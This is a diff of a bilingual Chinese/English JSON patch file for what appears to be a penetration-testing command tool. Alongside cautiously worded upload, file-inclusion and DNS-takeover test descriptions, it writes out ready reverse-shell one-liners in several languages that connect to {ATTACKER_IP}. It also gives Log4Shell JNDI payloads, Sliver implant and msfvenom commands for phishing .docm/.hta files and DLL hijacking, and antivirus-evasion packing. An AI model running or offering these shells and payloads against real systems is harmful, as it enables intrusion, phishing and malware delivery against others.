+      "zh": "ASP/ASPX 扩展名：列出 ASP、ASP.NET 页面、处理器、服务与 Razor 相关扩展，用于核对 IIS 请求筛选、应用保存规则和 handler mapping 是否一致；扩展名被接受不能证明服务器端执行。",
+      "en": "ASP/ASPX extension list for comparing IIS request filtering, application storage rules, and handler mappings; extension acceptance does not prove server-side execution."
+     }
+    },
+    {
+     "path": "commands.18.description",
+     "value": {
+      "zh": "JSP 扩展名：收集 JSP、JSPX、片段扩展及大小写、分号、空字节和 ADS 变体，用于比较 Java Web 应用保存逻辑与 servlet mapping；文件名命中列表不等于容器会编译或执行。",
+      "en": "JSP extension list with casing, semicolon, null-byte, and ADS variants for comparing Java web storage logic with servlet mappings; a matching filename does not mean the container compiles or executes it."
+     }
+    },
+    {
+     "path": "commands.19.description",
+     "value": {
+      "zh": "其他可执行扩展名：覆盖 CFML、CGI、脚本语言、原生二进制和 JVM 归档扩展，用于按已确认技术栈选择上传测试样例；这些后缀只有在存在相应运行时映射或后续加载路径时才有意义。",
+      "en": "Other executable extension list covering CFML, CGI, scripting languages, native binaries, and JVM archives for choosing upload tests against a confirmed stack; suffixes matter only when a runtime mapping or loading path exists."
+     }
+    },
+    {
+     "path": "commands.20.description",
+     "value": {
+      "zh": "静态文件扩展名(用于双扩展名)：汇总 HTML、XML、SVG、常见图片和设计文件扩展，用于构造双扩展基线并检查主动内容与被动媒体分类；静态后缀不能替代 MIME 和解析器验证。",
+      "en": "Static file extension list (HTML, XML, SVG, images, design files) for double-extension baselines and active-versus-passive content classification; static suffixes cannot replace MIME and parser validation."
+     }
+    },
+    {
+     "path": "commands.21.description",
+     "value": {
+      "zh": "Content-Type 绕过：收集图片、文本、脚本、归档、二进制、音视频和表单媒体类型，用于核对 multipart 声明、服务端检测和下游解析器选择；客户端 Content-Type 可伪造，不能单独证明文件类型。",
+      "en": "Media-type list covering images, text, scripts, archives, binaries, audiovisual, and form types for comparing multipart declarations, server-side detection, and downstream parser selection; client Content-Type is forgeable and cannot prove file type alone."
+     }
+    },
+    {
+     "path": "commands.22.description",
+     "value": {
+      "zh": "Python 扩展名：列出 Python 源码、字节码、类型声明、Cython 和平台扩展模块后缀，用于检查上传对象是否误入 import、插件或任务加载路径；后缀存在不代表 Python 会导入它。",
+      "en": "Python extension list covering source, bytecode, typing, Cython, and platform extension-module suffixes for checking whether uploads enter import, plugin, or task-loading paths."
+     }
+    },
+    {
+     "path": "commands.23.description",
+     "value": {
+      "zh": "Ruby 扩展名：覆盖 Ruby 脚本、Rack 配置和 ERB、Haml、Slim 模板后缀，用于检查上传数据是否跨入 require、模板渲染或应用启动边界；模板后缀被保存不等于被渲染。",
+      "en": "Ruby extension list covering scripts, Rack configuration, and ERB, Haml, and Slim template suffixes for checking whether uploads cross require, rendering, or application-start boundaries."
+     }
+    },
+    {
+     "path": "commands.24.description",
+     "value": {
+      "zh": "Node.js 扩展名：列出 CommonJS、ES Module、TypeScript、JSX 和 CoffeeScript 后缀，用于区分服务端模块加载、构建管线摄入和浏览器脚本返回三类边界；后缀命中本身没有执行语义。",
+      "en": "Node.js extension list covering CommonJS, ES module, TypeScript, JSX, and CoffeeScript suffixes for distinguishing server module loading, build-pipeline ingestion, and browser script serving."
+     }
+    },
+    {
+     "path": "commands.25.description",
+     "value": {
+      "zh": "Magic Bytes (文件头) 绕过：收集 GIF、PNG、JPEG、PDF、ZIP、BMP、TIFF、RIFF、GZIP、7-Zip、XML 和 SVG 的常见起始字节，用于测试检测器是否只看短前缀；签名匹配不能证明文件结构完整或内容安全。",
+      "en": "Magic-bytes list with common leading bytes for GIF, PNG, JPEG, PDF, ZIP, BMP, TIFF, RIFF, GZIP, 7-Zip, XML, and SVG to test short-prefix detection; a signature match proves neither structural validity nor safe content."
+     }
+    },
+    {
+     "path": "commands.8.name",
+     "value": {
+      "zh": ".htaccess竞态写入",
+      "en": ".htaccess Race Write"
+     }
+    },
+    {
+     "path": "commands.9.name",
+     "value": {
+      "zh": ".htaccess竞态覆盖",
+      "en": ".htaccess Race Overwrite"
+     }
+    },
+    {
+     "path": "commands.16.name",
+     "value": {
+      "zh": "PHP 扩展名绕过",
+      "en": "PHP Extension Bypass"
+     }
+    },
+    {
+     "path": "commands.17.name",
+     "value": {
+      "zh": "ASP/ASPX 扩展名",
+      "en": "ASP/ASPX Extensions"
+     }
+    },
+    {
+     "path": "commands.18.name",
+     "value": {
+      "zh": "JSP 扩展名",
+      "en": "JSP Extensions"
+     }
+    },
+    {
+     "path": "commands.19.name",
+     "value": {
+      "zh": "其他可执行扩展名",
+      "en": "Other Executable Extensions"
+     }
+    },
+    {
+     "path": "commands.20.name",
+     "value": {
+      "zh": "静态文件扩展名(用于双扩展名)",
+      "en": "Static File Extensions (Double-Extension Use)"
+     }
+    },
+    {
+     "path": "commands.21.name",
+     "value": {
+      "zh": "Content-Type 绕过",
+      "en": "Content-Type Bypass"
+     }
+    },
+    {
+     "path": "commands.22.name",
+     "value": {
+      "zh": "Python 扩展名",
+      "en": "Python Extensions"
+     }
+    },
+    {
+     "path": "commands.23.name",
+     "value": {
+      "zh": "Ruby 扩展名",
+      "en": "Ruby Extensions"
+     }
+    },
+    {
+     "path": "commands.24.name",
+     "value": {
+      "zh": "Node.js 扩展名",
+      "en": "Node.js Extensions"
+     }
+    },
+    {
+     "path": "commands.25.name",
+     "value": {
+      "zh": "Magic Bytes (文件头) 绕过",
+      "en": "Magic Bytes (File Header) Bypass"
+     }
+    }
+   ]
+  },
+  {
+   "id": "python-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    }
+   ]
+  },
+  {
+   "id": "lua-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "lua5.1 -e 'local socket=require(\"socket\"); local tcp=assert(socket.tcp()); assert(tcp:connect(\"{ATTACKER_IP}\",{PORT})); while true do local cmd,status=tcp:receive(\"*l\"); if not cmd then break end; local f=assert(io.popen(cmd..\" 2>&1\",\"r\")); local out=f:read(\"*a\"); f:close(); tcp:send(out); if status==\"closed\" then break end end; tcp:close()'"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "lua5.1 -e 'local s=require(\"socket\").tcp(); assert(s:connect(\"127.0.0.1\",{PORT})); assert(s:send(\"LUA_SOCKET_MARKER\\n\")); s:close()'"
+    }
+   ]
+  },
+  {
+   "id": "awk-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "gawk 'BEGIN{s=\"/inet/tcp/0/{ATTACKER_IP}/{PORT}\";while((s|&getline c)>0){while((c|&getline line)>0)print line|&s;close(c)}close(s)}'"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "gawk 'BEGIN{s=\"/inet/udp/0/127.0.0.1/{PORT}\";print \"GAWK_UDP_MARKER\"|&s;close(s)}'"
+    }
+   ]
+  },
+  {
+   "id": "nodejs-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"sh\",[]);var client=new net.Socket();client.connect(4444,\"{ATTACKER_IP}\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "require(\"child_process\").exec(\"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1'\")"
+    },
+    {
+     "path": "commands.3.command",
+     "value": "node -e \"var n=require('net'),s=require('child_process').spawn('/bin/sh',[]);var c=n.connect(4444,'{ATTACKER_IP}');c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)\""
+    }
+   ]
+  },
+  {
+   "id": "java-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "Runtime rt = Runtime.getRuntime();\nString[] cmd = {\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1\"};\nrt.exec(cmd);"
+    }
+   ]
+  },
+  {
+   "id": "jndi-exploit",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "java -jar JNDIExploit.jar -i {ATTACKER_IP}"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "# 触发Payload:\n${jndi:ldap://{ATTACKER_IP}:1389/Basic/Command/Base64/Y21k}\n${jndi:ldap://{ATTACKER_IP}:1389/Basic/ReverseShell/{ATTACKER_IP}/4444}"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "# 使用Tomcat Bypass:\n${jndi:ldap://{ATTACKER_IP}:1389/TomcatBypass/Command/Base64/d2hvYW1p}\n# 使用反序列化Bypass:\n${jndi:ldap://{ATTACKER_IP}:1389/Deserialization/CommonsCollections5/Command/Base64/d2hvYW1p}"
+    }
+   ]
+  },
+  {
+   "id": "ysoserial",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "# 监听端(攻击机):\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 \"bash -c {echo,base64_cmd}|{base64,-d}|{bash,-i}\"\n\n# 发送JRMP客户端Payload:\njava -jar ysoserial.jar JRMPClient {ATTACKER_IP}:1099 > jrmp.bin"
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "Shiro rememberMe Canary 检查",
+      "en": "Shiro rememberMe Canary Check"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sliver",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "# 在Sliver控制台:\ngenerate --mtls {ATTACKER_IP} --os windows --arch amd64 --save implant.exe\ngenerate --http {ATTACKER_IP} --os linux --format shared --save implant.so"
+    }
+   ]
+  },
+  {
+   "id": "mythic",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "https://{ATTACKER_IP}:7443\n# 默认账号: mythic_admin\n# 密码查看: cat .env | grep MYTHIC_ADMIN_PASSWORD"
+    }
+   ]
+  },
+  {
+   "id": "metasploit",
+   "patches": [
+    {
+     "path": "commands.8.command",
+     "value": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe -o payload.exe"
+    }
+   ]
+  },
+  {
+   "id": "metasploit-advanced",
+   "patches": [
+    {
+     "path": "commands.5.command",
+     "value": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe -o payload.exe\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f elf -o shell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f raw -o shell.php\nmsfvenom -p java/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f war -o shell.war"
+    }
+   ]
+  },
+  {
+   "id": "windows-privesc-techniques",
+   "patches": [
+    {
+     "path": "commands.4.command",
+     "value": "# 查找 DLL 搜索顺序漏洞\nProcess Monitor: 过滤 NAME NOT FOUND + .dll\n# 创建恶意 DLL\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f dll -o hijack.dll"
+    }
+   ]
+  },
+  {
+   "id": "red-team-operations",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "# 钓鱼邮件附件\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST={ATTACKER_IP} LPORT=443 -f docm -o evil.docm\n# 宏木马\n# HTA 文件\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f hta-psh -o evil.hta"
+    }
+   ]
+  },
+  {
+   "id": "anti-av-techniques",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f raw -o raw.bin\npython3 packer.py raw.bin packed.exe\n# 常用工具: ConfuserEx (.NET), Gobfuscate (Go)"
+    }
+   ]
+  },
+  {
+   "id": "burpsuite",
+   "patches": [
+    {
+     "path": "commands.8.description",
+     "value": {
+      "zh": "LFI 测试前的基线探测：用 curl 确认本机目标可达并返回 200 与首页内容（curl 退出码 0 即基线正常），再逐条提交文件包含 Payload。",
+      "en": "Baseline check before LFI testing: curl the local target to confirm a 200 response with homepage content (exit code 0 means the baseline is healthy) before submitting inclusion payloads one by one."
+     }
+    },
+    {
+     "path": "commands.9.description",
+     "value": {
+      "zh": "php:// 协议的 URL 编码变体：仅编码协议前缀（%70%68%70%3A%2F%2F）绕过对 php:// 字面量的过滤，粘贴进目标 file 参数后返回 base64 内容或标记回显即命中。",
+      "en": "URL-encoded php:// wrapper variants that encode only the protocol prefix (%70%68%70%3A%2F%2F) to bypass literal php:// filtering; base64 content or marker echo after submission into the file parameter indicates a hit."
+     }
+    },
+    {
+     "path": "commands.10.description",
+     "value": {
+      "zh": "php://filter 的全 URL 编码形式（协议与分隔符均编码），用于检测只做一次解码或黑名单匹配原始字符串的过滤实现；响应中出现可解码的 base64 即命中。",
+      "en": "Fully URL-encoded php://filter forms (protocol and separators encoded) to detect filters that decode only once or blacklist the raw string; decodable base64 in the response indicates a hit."
+     }
+    },
+    {
+     "path": "commands.11.description",
+     "value": {
+      "zh": "php://input 包含请求模板：向 /include?file=php://input 提交 POST 固定标记，Content-Length 须与 body 字节数一致；服务端 allow_url_include 开启时返回该标记即包含执行成立。",
+      "en": "php://input inclusion request template: POST a fixed marker to /include?file=php://input with Content-Length matching the body bytes; the marker returning when allow_url_include is enabled confirms inclusion execution."
+     }
+    },
+    {
+     "path": "commands.12.description",
+     "value": {
+      "zh": "用 curl 重放 php://input 包含请求，Body 为标记的 Base64 编码；响应中回显标记或出现与明文提交不同的解析差异即证明 wrapper 生效。",
+      "en": "Replay the php://input inclusion request with curl using a base64-encoded marker body; marker echo or parsing differences from the plaintext submission prove the wrapper is active."
+     }
+    },
+    {
+     "path": "commands.13.description",
+     "value": {
+      "zh": "data:// wrapper 的 URL 编码变体：把协议字面量编码为 data%3A%2F%2F 绕过简单黑名单；响应回显 PAYLOADER_MARKER 即命中。",
+      "en": "URL-encoded data:// wrapper variant that encodes the protocol literal as data%3A%2F%2F to bypass simple blacklists; PAYLOADER_MARKER echoed in the response indicates a hit."
+     }
+    },
+    {
+     "path": "commands.23.description",
+     "value": {
+      "zh": "上传文件名/路径穿越变体清单（..\\ 反斜杠、%5c 编码、....//、..;/ 截断、前导 / 与归一化残留），逐条提交并对比服务端实际保存路径。",
+      "en": "Upload filename and path traversal variant list (backslash, %5c encoding, ....//, ..;/ truncation, leading slash, and normalization residue); submit each and compare the actual server-side storage path."
+     }
+    },
+    {
+     "path": "commands.24.description",
+     "value": {
+      "zh": "已上传对象的公开暴露验证：HEAD 确认 200 后下载内容并 grep 固定标记，输出 marker_object_verified 即确认可被未授权读取。",
+      "en": "Public exposure verification of uploaded objects: HEAD confirms 200, then download the content and grep the fixed marker; marker_object_verified in the output confirms unauthorized read access."
+     }
+    },
+    {
+     "path": "commands.15.description",
+     "value": {
+      "zh": "Intruder Pitchfork 模式：username/password 两个位置各绑定一个两行字典并一一对应推进（共 2 次请求、单并发），仅用合成账号验证登录差异逻辑。",
+      "en": "Intruder Pitchfork mode: bind one two-line dictionary to each of the username and password positions and advance them in lockstep (2 requests total, single thread), using only synthetic accounts to verify login-difference logic."
+     }
+    },
+    {
+     "path": "commands.16.description",
+     "value": {
+      "zh": "Intruder Cluster bomb 模式：两个位置的字典做笛卡尔积（2×2 共 4 次请求、单并发），验证登录逻辑对凭据组合的处理，仅使用合成账号。",
+      "en": "Intruder Cluster bomb mode: take the Cartesian product of the two position dictionaries (2x2 = 4 requests, single thread) to verify how the login logic handles credential combinations, using only synthetic accounts."
+     }
+    },
+    {
+     "path": "commands.17.name",
+     "value": {
+      "zh": "会话 Cookie 属性审查",
+      "en": "Session Cookie Attribute Review"
+     }
+    },
+    {
+     "path": "commands.18.name",
+     "value": {
+      "zh": "验证码三用例重放测试",
+      "en": "CAPTCHA Three-Case Replay Test"
+     }
+    },
+    {
+     "path": "commands.19.name",
+     "value": {
+      "zh": "OAuth redirect_uri 注册校验",
+      "en": "OAuth redirect_uri Registration Check"
+     }
+    },
+    {
+     "path": "commands.20.name",
+     "value": {
+      "zh": "SAML 响应本地解析",
+      "en": "SAML Response Local Parsing"
+     }
+    },
+    {
+     "path": "commands.21.name",
+     "value": {
+      "zh": "单因素会话越权访问验证",
+      "en": "Single-Factor Session Access Check"
+     }
+    },
+    {
+     "path": "commands.22.name",
+     "value": {
+      "zh": "验证码重放拒绝验证",
+      "en": "CAPTCHA Replay Rejection Check"
+     }
+    }
+   ]
+  },
+  {
+   "id": "dnsrecon",
+   "patches": [
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "常见 nameserver 主机名候选（ns1/ns2/dns1 等），用作 DNS 枚举词典输入；是否存在接管风险需按父区委派、注册域控制、glue 记录和权威回答逐项验证。",
+      "en": "Common nameserver hostname candidates (ns1/ns2/dns1 and similar) used as DNS enumeration dictionary input; takeover risk must be verified per case through parent-zone delegation, registrable-domain control, glue records, and authoritative answers."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "MX记录接管：核对 MX priority、供应商资源绑定和域所有权，使用隔离测试邮件确认真实接收控制；不把供应商后缀或 SMTP 错误当作接管。",
+      "en": "MX record takeover: review MX priority, provider resource binding, and domain ownership, and confirm real receiving control with isolated test mail; provider suffixes or SMTP errors are never treated as takeover."
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "NS记录接管",
+      "en": "NS Record Takeover"
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "MX记录接管",
+      "en": "MX Record Takeover"
+     }
+    }
+   ]
+  },
+  {
+   "id": "jwt-tool",
+   "patches": [
+    {
+     "path": "commands.10.description",
+     "value": {
+      "zh": "常见 JWT HMAC 弱密钥候选（50 项），仅用于对自有令牌做离线字典验证（如 jwt_tool -d 的输入），不用于在线攻击。",
+      "en": "Common JWT HMAC weak-key candidates (50 entries) for offline dictionary verification of tokens you own, such as input for jwt_tool -d; not for online attacks."
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "夹具令牌受限字典验证",
+      "en": "Fixture Token Bounded Dictionary Check"
+     }
+    },
+    {
+     "path": "commands.6.name",
+     "value": {
+      "zh": "PyJWT 弱密钥签名生成",
+      "en": "PyJWT Weak-Key Signature Generation"
+     }
+    },
+    {
+     "path": "commands.10.name",
+     "value": {
+      "zh": "JWT 弱 HMAC 密钥候选字典",
+      "en": "JWT Weak HMAC Key Candidate List"
+     }
+    },
+    {
+     "path": "installation",
+     "value": {
+      "zh": "官方口径：git clone https://github.com/ticarpi/jwt_tool 后 pip install -r requirements.txt；PyPI 无官方 jwt_tool 包，pip3 install jwt_tool 不可靠。",
+      "en": "The official method is cloning the ticarpi/jwt_tool project and running pip install -r requirements.txt; there is no official PyPI package, so pip3 install jwt_tool is unreliable."
+     }
+    }
+   ]
+  },
+  {
+   "id": "dnsx",
+   "patches": [
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "CNAME 指向已释放服务（GitHub Pages）的候选子域：先用 DNS 工具解析 CNAME，再按 GitHub Pages 官方自定义域与域验证流程判断是否为真实悬空绑定。",
+      "en": "Candidate subdomains whose CNAME points to a released service (GitHub Pages): resolve the CNAME with DNS tooling first, then judge whether it is a genuinely dangling binding through the official GitHub Pages custom-domain and verification workflow."
+     }
+    },
+    {
+     "path": "commands.4.name",
+     "value": {
+      "zh": "CNAME指向已释放服务 (GitHub Pages)",
+      "en": "CNAME to Released Service (GitHub Pages)"
+     }
+    }
+   ]
+  },
+  {
+   "id": "ctf-crypto-tools",
+   "patches": [
+    {
+     "path": "commands.9.description",
+     "value": {
+      "zh": "常见padding错误消息：整理填充、解密和 MAC 失败文本用于响应分类；该集合是分析工具输入，不是构造密文的攻击载荷。",
+      "en": "Common padding error messages covering padding, decryption, and MAC failure text for response classification; the set is analysis-tool input, not crafted ciphertext payloads."
+     }
+    },
+    {
+     "path": "commands.9.name",
+     "value": {
+      "zh": "常见padding错误消息",
+      "en": "Common Padding Error Messages"
+     }
+    }
+   ]
+  },
+  {
+   "id": "lfi-rfi-tools",
+   "patches": [
+    {
+     "path": "commands.29.description",
+     "value": {
+      "zh": "常见日志、邮件、PHP 会话与 /proc 路径清单，供已确认文件包含后选择最小影响读取目标；本清单不含投毒请求。",
+      "en": "Common log, mail, PHP session, and /proc path list for choosing a minimal-impact read target after file inclusion is confirmed; contains no poisoning request."
+     }
+    },
+    {
+     "path": "commands.30.description",
+     "value": {
+      "zh": "Windows 常见敏感文件路径（hosts、networks、repair 配置单元、boot.ini、web.config），用于确认任意读取后的影响评估；部分文件在新版本系统不存在或受 ACL 保护。",
+      "en": "Common Windows sensitive file paths (hosts, networks, repair hives, boot.ini, web.config) for impact assessment after arbitrary read; some files are absent or ACL-protected on newer systems."
+     }
+    },
+    {
+     "path": "commands.31.description",
+     "value": {
+      "zh": "Linux 常见敏感文件与配置路径清单（身份、服务配置、Web 配置、Shell 历史、SSH 密钥、procfs），用于已确认 LFI 后的读取范围评估；通配符仅在目标代码主动展开时有效。",
+      "en": "Common Linux sensitive file and configuration path list (identity, service config, web config, shell history, SSH keys, procfs) for scoping reads after LFI is confirmed; wildcards work only when target code expands them."
+     }
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "夹具文件相对路径变体（工作目录、上级目录、/proc/self/cwd），逐条替换到 file 参数，返回内容等于固定标记即包含成功。",
+      "en": "Fixture file relative path variants (working directory, parent directory, /proc/self/cwd); substitute each into the file parameter, and returned content equal to the fixed marker means inclusion succeeded."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "PHP wrapper 变体清单：filter 读源码、data 输出标记、phar/zip 解析归档成员；各自依赖不同配置与 sink，需单独判定。",
+      "en": "PHP wrapper variant list: filter reads source, data outputs the marker, phar and zip parse archive members; each depends on different configuration and sinks and must be judged separately."
+     }
+    },
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "路径编码与归一化绕过变体（..%2f、..%252f、....//），用于检测只解码一次或未做 realpath 归一化的实现。",
+      "en": "Path encoding and normalization bypass variants (..%2f, ..%252f, ....//) for detecting implementations that decode once or skip realpath normalization."
+     }
+    },
+    {
+     "path": "commands.9.description",
+     "value": {
+      "zh": "access.log 的相对路径、上级目录与 /proc/self/cwd 变体，用于已确认文件包含后定位日志读取入口。",
+      "en": "access.log relative path, parent directory, and /proc/self/cwd variants for locating a log-read entry point after file inclusion is confirmed."
+     }
+    },
+    {
+     "path": "commands.10.description",
+     "value": {
+      "zh": "php://filter 读取变体：base64 编码读取 PHP 源文件与 string.rot13 变换读取文本文件，响应可解码即命中。",
+      "en": "php://filter read variants: base64 decoding of PHP source and string.rot13 transformation of text files; decodable responses indicate a hit."
+     }
+    },
+    {
+     "path": "commands.11.description",
+     "value": {
+      "zh": "php://input 包含用法：POST 固定标记、Content-Type 为 text/plain；需服务端 allow_url_include=On 才会执行或返回标记。",
+      "en": "php://input usage: POST a fixed marker with Content-Type text/plain; server-side allow_url_include must be On for execution or marker return."
+     }
+    },
+    {
+     "path": "commands.12.description",
+     "value": {
+      "zh": "data:// 的纯文本与 Base64 两种形式，作为 file 参数值直接提交，响应回显标记即命中。",
+      "en": "data:// in plain text and Base64 forms submitted directly as the file parameter value; marker echo in the response indicates a hit."
+     }
+    },
+    {
+     "path": "commands.13.description",
+     "value": {
+      "zh": "phar:// 成员包含：读取 ./payloader-fixture/PAYLOADER_MARKER.phar 内的 marker.txt；需目标 PHP 启用 phar 且已能上传归档。",
+      "en": "phar:// member inclusion reading marker.txt inside the fixture Phar; requires the target PHP to enable phar and allow archive upload."
+     }
+    },
+    {
+     "path": "commands.14.description",
+     "value": {
+      "zh": "zip:// 成员包含：以 # 指定归档内路径读取 zip 成员，验证后端对 zip stream 的解析。",
+      "en": "zip:// member inclusion using # to address the archive-internal path, verifying backend parsing of zip streams."
+     }
+    },
+    {
+     "path": "commands.15.description",
+     "value": {
+      "zh": "/proc/self/cwd 与 Windows %CD% 形式的夹具路径变体，探测后端工作目录解析与路径拼接行为。",
+      "en": "Fixture path variants in /proc/self/cwd and Windows %CD% forms probing backend working-directory resolution and path concatenation."
+     }
+    },
+    {
+     "path": "commands.16.description",
+     "value": {
+      "zh": "php://filter 链式变换（toupper、rot13 及两者串联），验证 filter 链可用，常用于绕过内容级过滤。",
+      "en": "php://filter chained transformations (toupper, rot13, and both chained) verifying filter-chain availability, commonly used to bypass content-level filtering."
+     }
+    },
+    {
+     "path": "commands.17.description",
+     "value": {
+      "zh": "本地验证 filter 链：php -r 直接读取夹具文件确认变换输出，再对目标发起同样请求比对结果。",
+      "en": "Locally verify the filter chain: php -r reads the fixture file to confirm transformed output before sending the same request to the target for comparison."
+     }
+    },
+    {
+     "path": "commands.18.description",
+     "value": {
+      "zh": "先计算标记的 Base64，再以 data://text/plain;base64 形式提交，验证目标对 Base64 data wrapper 的解析。",
+      "en": "Compute the marker Base64 first, then submit it as data://text/plain;base64 to verify target parsing of the Base64 data wrapper."
+     }
+    },
+    {
+     "path": "commands.19.description",
+     "value": {
+      "zh": "data:// 的 text/plain 与 text/csv 两种 MIME 变体，检测按 MIME 或扩展名过滤的实现差异。",
+      "en": "data:// text/plain and text/csv MIME variants detecting implementations that filter by MIME type or extension."
+     }
+    },
+    {
+     "path": "commands.20.description",
+     "value": {
+      "zh": "以 phar:// 指向 .zip 归档读取成员（PHP 将 zip 归档按 phar 流解析），验证后端封装解析顺序。",
+      "en": "phar:// pointing at a .zip archive to read members (PHP parses zip archives as phar streams), verifying backend wrapper resolution order."
+     }
+    },
+    {
+     "path": "commands.21.description",
+     "value": {
+      "zh": "php://filter 嵌套 phar://：先定位归档成员再 base64 编码输出，用于绕过对 php 标签或关键字的内容过滤。",
+      "en": "php://filter wrapping phar:// to locate archive members and output them base64-encoded, bypassing content filters on PHP tags or keywords."
+     }
+    },
+    {
+     "path": "commands.22.description",
+     "value": {
+      "zh": "PHP 会话文件路径变体（sess_PAYLOADERMARKER），用于包含会话数据中可控内容的场景。",
+      "en": "PHP session file path variants (sess_PAYLOADERMARKER) for scenarios where session data with controllable content gets included."
+     }
+    },
+    {
+     "path": "commands.23.description",
+     "value": {
+      "zh": "/proc/self/cwd 的归一化变体（./、subdir/../），检测后端路径归一化差异。",
+      "en": "/proc/self/cwd normalization variants (./ and subdir/../) detecting backend path normalization differences."
+     }
+    },
+    {
+     "path": "commands.24.description",
+     "value": {
+      "zh": "带与不带前导斜杠的 /proc/self/cwd 查询变体，检测目标路径拼接实现差异。",
+      "en": "/proc/self/cwd query variants with and without the leading slash detecting target path-concatenation differences."
+     }
+    },
+    {
+     "path": "commands.25.description",
+     "value": {
+      "zh": "对 /download 接口逐一请求 fixtures 目录下的 yml/xml/properties 标记文件并 grep 固定标记：输出 marker_read 即穿越读取成功。",
+      "en": "Request each yml/xml/properties marker file under the fixtures directory through the /download endpoint and grep the fixed marker; marker_read in the output means traversal read succeeded."
+     }
+    },
+    {
+     "path": "commands.26.description",
+     "value": {
+      "zh": "对 ../outside/ 下三类标记文件循环请求并 grep 标记：任一输出 marker_read 即证明越界读取成功。",
+      "en": "Loop requests over the three marker files under ../outside/ and grep the marker; any marker_read output proves out-of-bounds reading."
+     }
+    },
+    {
+     "path": "commands.27.description",
+     "value": {
+      "zh": "对 /file 接口逐条提交编码穿越变体（%2e、双重编码、....//、反斜杠、%00 截断），响应含固定标记即穿越读取成功。",
+      "en": "Submit encoded traversal variants one by one to the /file endpoint (%2e, double encoding, ....//, backslash, %00 truncation); the fixed marker in the response means traversal read succeeded."
+     }
+    },
+    {
+     "path": "commands.29.name",
+     "value": {
+      "zh": "Log Poisoning路径",
+      "en": "Log Poisoning Paths"
+     }
+    },
+    {
+     "path": "commands.30.name",
+     "value": {
+      "zh": "Windows路径",
+      "en": "Windows Paths"
+     }
+    },
+    {
+     "path": "commands.31.name",
+     "value": {
+      "zh": "常见LFI敏感文件",
+      "en": "Common LFI Sensitive Files"
+     }
+    }
+   ]
+  },
+  {
+   "id": "xss-tools",
+   "patches": [
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "Awesome-WAF 补充字典：事件属性、编码变体与 URL 样例；外带地址已参数化为 {ATTACKER_HOST}，使用时替换为自有回调地址。",
+      "en": "Awesome-WAF supplement dictionary of event attributes, encoding variants, and URL samples; out-of-band addresses are parameterized as {ATTACKER_HOST} and must be replaced with your own callback."
+     }
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "Awesome-WAF 汇总的编码与解析差异 XSS 字典，作为 dalfox --custom-payload 或 Intruder 的字典输入，在具体反射上下文中逐条验证。",
+      "en": "Awesome-WAF collection of encoding and parser-differential XSS dictionaries, used as custom payload input for dalfox --custom-payload or Intruder and verified one by one in the concrete reflection context."
+     }
+    },
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "事件属性与标签变体字典：焦点/悬停事件、SVG/IMG/BODY 加载事件、模板字面量与按键记录示例；{ATTACKER_HOST} 替换为自有回调地址，仅限授权环境。",
